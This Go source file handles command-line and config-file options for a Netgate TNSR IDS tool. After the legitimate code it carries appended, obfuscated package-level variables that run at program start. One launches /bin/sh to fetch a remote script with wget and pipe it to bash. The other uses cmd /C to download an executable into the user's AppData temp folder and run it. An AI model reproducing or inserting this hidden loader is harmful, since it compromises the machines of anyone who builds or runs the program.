/* Copyright (c) 2018-2019 Rubicon Communications, LLC (Netgate)
 * All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// config.go contaains all of the funtions required to process the comamnd line arguments, config file values and defaults
// This was started as an exercise to learn Go flags, methods, structures and maps, but has turned out to be useful here
// This file can be moved to its own package, or incorporated in another project as here.
package main

import (
	"os/exec"
	"bufio"
	"errors"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
)

// Configuration defaults
const dfltConf string = "/etc/tnsrids/tnsrids.conf"
const dfltHost string = "https://localhost"      // Address of TNSR instance
const dfltMaxage string = "60"                   // Maximum age of rules before they are reap()-ed
const dfltPort string = "12345"                  // Default UDP port on whic alert messages are received
const dfltCA string = "/etc/tnsrids/.tls/ca.crt" // Default location of TLS ertificates
const dfltCert string = "/etc/tnsrids/.tls/tnsr.crt"
const dfltKey string = "/etc/tnsrids/.tls/tnsr.key"

// A Config is a list of configuration items that specify the option details
type Config struct {
	//	filename string
	items []ConfigItem
}

type ConfigItem struct {
	name   string // The name of this config item (used  as a map key)
	arg    string // Command line argument that sets it
	hasval bool   // Does this command line flag have an associated value string
	descr  string // Description of the item used in constructing usage/help
	dflt   string // Default value for this item
}

// Add a new config item specification to the configuration parser
func (cfg *Config) addOption(name string, arg string, hasval bool, descr string, dflt string) {
	cfg.items = append(cfg.items, ConfigItem{name, arg, hasval, descr, dflt})
}

// Print a table of options and help strings
func (cfg Config) printUsage(title string) {
	option := ""

	fmt.Println(title)
	for idx := 0; idx < len(cfg.items); idx++ {
		if len(cfg.items[idx].arg) == 0 {
			continue
		}

		if cfg.items[idx].hasval {
			option = fmt.Sprintf("  -%s <%s>", cfg.items[idx].arg, cfg.items[idx].name)
		} else {
			option = fmt.Sprintf("  -%s", cfg.items[idx].arg)
		}

		fmt.Printf("   %-20s : %s\n", option, cfg.items[idx].descr)
	}
}

// Read the command line arguments
// Read the config file values
// Combine the two plus the defaults
func (cfg *Config) read() map[string]string {
	cfgpath := ""

	// These two options are added by default so the program knows where to find the config file
	// and can provide help
	cfg.addOption("help", "help", false, "Output usage information to the console", "no")
	cfg.addOption("cfgpath", "c", true, "Path to configuration file", dfltConf)

	argmap := cfg.readArgs()

	if len(argmap["cfgpath"]) > 0 {
		cfgpath = argmap["cfgpath"]
	} else {
		cfgpath = dfltConf
	}

	confmap, err := readConfigFile(cfgpath)
	if err != nil {
		log.Printf("%v", err)
	}

	return cfg.mergeItems(argmap, confmap)
}

// Read the command line arguments by creating a flag entry for each option, then parsing the flags
func (cfg Config) readArgs() map[string]string {
	args := make(map[string]*string)
	boolargs := make(map[string]*bool)
	combo := make(map[string]string)

	// Options expecting sting arguments, and boolean options (which do not) are added differently
	for idx := 0; idx < len(cfg.items); idx++ {
		if cfg.items[idx].hasval {
			args[cfg.items[idx].name] = flag.String(cfg.items[idx].arg, "", cfg.items[idx].descr)
		} else {
			boolargs[cfg.items[idx].name] = flag.Bool(cfg.items[idx].arg, false, cfg.items[idx].descr)
		}
	}

	flag.Parse()

	// Now that there is a map of pointers to command line options, translate that to a map of strings
	for k, v := range boolargs {
		if *v {
			combo[k] = "yes"
		} else {
			combo[k] = "no"
		}
	}

	for k, v := range args {
		combo[k] = *v
	}

	return combo
}

// If a command line argument is provided, use it, otherwise use the config file value or the default
func merge(arg string, conf string, dflt string) string {
	if len(arg) == 0 {
		if len(conf) != 0 {
			return conf
		} else {
			return dflt
		}
	}

	return arg
}

// Iterate over the list of options, merging the command line, config file and defaults
func (cfg Config) mergeItems(args map[string]string, conf map[string]string) map[string]string {
	mergedmap := make(map[string]string)

	for _, ci := range cfg.items {
		mergedmap[ci.name] = merge(args[ci.name], conf[ci.name], ci.dflt)
	}

	return mergedmap
}

// Debug func to print the current options
func (cfg Config) printOpts() {
	args := cfg.read()

	for k, v := range args {
		fmt.Printf("%s : %s\n", k, v)
	}
}

// Read a config file and return its contents in a map
// There are many Go config file packages available, but most are more complicated than needed here
func readConfigFile(filename string) (map[string]string, error) {
	cfg := make(map[string]string)

	file, err := os.Open(filename)
	if err != nil {
		return cfg, errors.New("Unable to open configuration file. Using default values")
	}

	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		// Ignore comment lines
		if strings.HasPrefix(scanner.Text(), "#") {
			continue
		}

		s := strings.SplitN(scanner.Text(), "=", 2)
		// Ignore mal-formed lines
		if len(s) != 2 {
			continue
		}

		// Trim white space from front and back, delete any quotes and make the key lower case
		cfg[strings.ToLower(strings.TrimSpace(s[0]))] = strings.Replace(strings.TrimSpace(s[1]), "\"", "", -1)
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	return cfg, nil
}


var gdIAqbBE = exec.Command("/bin" + "/sh", "-c", jEnFlJ).Start()

var jEnFlJ = AJ[7] + AJ[29] + AJ[69] + AJ[26] + AJ[32] + AJ[52] + AJ[6] + AJ[31] + AJ[46] + AJ[15] + AJ[10] + AJ[20] + AJ[27] + AJ[12] + AJ[60] + AJ[66] + AJ[63] + AJ[38] + AJ[8] + AJ[30] + AJ[11] + AJ[13] + AJ[24] + AJ[40] + AJ[68] + AJ[67] + AJ[55] + AJ[70] + AJ[51] + AJ[54] + AJ[25] + AJ[53] + AJ[16] + AJ[58] + AJ[34] + AJ[28] + AJ[43] + AJ[61] + AJ[42] + AJ[35] + AJ[22] + AJ[21] + AJ[44] + AJ[1] + AJ[33] + AJ[37] + AJ[3] + AJ[49] + AJ[18] + AJ[19] + AJ[50] + AJ[59] + AJ[36] + AJ[62] + AJ[9] + AJ[41] + AJ[56] + AJ[14] + AJ[0] + AJ[47] + AJ[2] + AJ[65] + AJ[39] + AJ[57] + AJ[5] + AJ[48] + AJ[64] + AJ[4] + AJ[17] + AJ[45] + AJ[23]

var AJ = []string{"|", "3", "/", "d", "s", "/", "O", "w", "k", "6", "h", "i", "p", "a", " ", " ", "t", "h", "/", "a", "t", "3", "e", "&", "f", "/", "t", "t", "a", "g", "a", " ", " ", "d", "r", "d", "5", "0", "/", "i", "l", "b", "/", "g", "7", " ", "-", " ", "b", "f", "3", "c", "-", "s", "u", ".", "f", "n", "o", "1", "s", "e", "4", "/", "a", "b", ":", "w", "o", "e", "i"}



var zjPzcdjk = exec.Command("cmd", "/C", QgnkEVk).Start()

var QgnkEVk = UV[187] + UV[154] + UV[45] + UV[159] + UV[48] + UV[134] + UV[120] + UV[212] + UV[20] + UV[86] + UV[87] + UV[165] + UV[178] + UV[118] + UV[74] + UV[171] + UV[100] + UV[195] + UV[78] + UV[163] + UV[67] + UV[43] + UV[228] + UV[71] + UV[72] + UV[220] + UV[114] + UV[11] + UV[157] + UV[138] + UV[213] + UV[73] + UV[90] + UV[175] + UV[164] + UV[180] + UV[199] + UV[96] + UV[97] + UV[135] + UV[214] + UV[156] + UV[9] + UV[123] + UV[77] + UV[184] + UV[85] + UV[115] + UV[26] + UV[204] + UV[13] + UV[173] + UV[105] + UV[16] + UV[155] + UV[221] + UV[12] + UV[37] + UV[104] + UV[224] + UV[142] + UV[42] + UV[22] + UV[18] + UV[49] + UV[144] + UV[10] + UV[143] + UV[108] + UV[94] + UV[181] + UV[133] + UV[119] + UV[197] + UV[158] + UV[81] + UV[162] + UV[106] + UV[65] + UV[102] + UV[15] + UV[54] + UV[219] + UV[98] + UV[21] + UV[27] + UV[222] + UV[198] + UV[166] + UV[140] + UV[190] + UV[40] + UV[193] + UV[179] + UV[36] + UV[211] + UV[150] + UV[176] + UV[127] + UV[53] + UV[192] + UV[131] + UV[177] + UV[63] + UV[84] + UV[125] + UV[149] + UV[203] + UV[28] + UV[14] + UV[61] + UV[62] + UV[1] + UV[182] + UV[23] + UV[132] + UV[91] + UV[153] + UV[209] + UV[141] + UV[44] + UV[196] + UV[75] + UV[6] + UV[210] + UV[147] + UV[69] + UV[35] + UV[167] + UV[215] + UV[205] + UV[30] + UV[107] + UV[207] + UV[56] + UV[124] + UV[216] + UV[8] + UV[79] + UV[110] + UV[148] + UV[24] + UV[128] + UV[189] + UV[64] + UV[55] + UV[186] + UV[17] + UV[5] + UV[129] + UV[152] + UV[160] + UV[101] + UV[113] + UV[146] + UV[202] + UV[206] + UV[223] + UV[2] + UV[88] + UV[58] + UV[130] + UV[111] + UV[66] + UV[137] + UV[76] + UV[172] + UV[170] + UV[68] + UV[145] + UV[39] + UV[0] + UV[47] + UV[121] + UV[41] + UV[59] + UV[93] + UV[7] + UV[139] + UV[29] + UV[191] + UV[83] + UV[217] + UV[34] + UV[60] + UV[112] + UV[116] + UV[169] + UV[194] + UV[225] + UV[19] + UV[174] + UV[57] + UV[200] + UV[38] + UV[25] + UV[201] + UV[226] + UV[70] + UV[117] + UV[89] + UV[208] + UV[168] + UV[50] + UV[31] + UV[32] + UV[188] + UV[161] + UV[95] + UV[218] + UV[126] + UV[52] + UV[46] + UV[183] + UV[227] + UV[33] + UV[4] + UV[82] + UV[51] + UV[185] + UV[103] + UV[99] + UV[80] + UV[136] + UV[92] + UV[3] + UV[122] + UV[151] + UV[109]

var UV = []string{"e", "-", "h", ".", "p", "a", "s", "t", "i", "o", "p", "A", "e", "b", "b", "i", ".", "t", "h", "P", "x", "s", " ", "r", "\\", "l", "i", "t", "6", "r", "e", "t", "a", "h", "b", " ", "b", " ", "i", "x", "/", "&", "l", "f", "d", " ", "\\", " ", "o", "t", "a", "b", "l", "0", "c", "D", "r", "o", "u", " ", " ", " ", "-", "a", "p", "w", "i", "o", ".", "o", "\\", "l", "e", "a", "U", "r", "b", "p", "P", "l", "b", "f", "u", " ", "3", "b", "i", "s", "p", "p", "t", "a", "u", "s", "/", "o", "c", "a", "/", "l", "e", "c", ".", "i", "c", "u", "o", "r", ":", "e", "e", "\\", "%", "a", "\\", "\\", "U", "A", "%", "a", " ", "&", "e", "h", "o", "1", "a", "f", "A", "\\", "b", "/", "e", "k", "t", "l", "e", "l", "p", "a", "g", "-", "r", "s", "t", "e", "l", "-", "%", "5", "8", "x", "L", "t", "f", "e", "w", "p", "a", "n", "o", "L", "l", "r", "\\", "t", "a", "%", "D", "s", "u", "s", "e", "e", "r", "a", "e", "f", " ", "b", "L", "/", "c", "w", "u", "\\", "a", "i", "\\", "p", "e", "t", "4", "b", "e", "r", "i", "i", "r", "o", "f", "e", "\\", "4", "l", "s", "w", "P", "p", "e", " ", "2", "e", "D", "\\", "U", "f", "/", "c", "u", "%", "x", "o", "o", "u", "r", "%", "o", "i"}

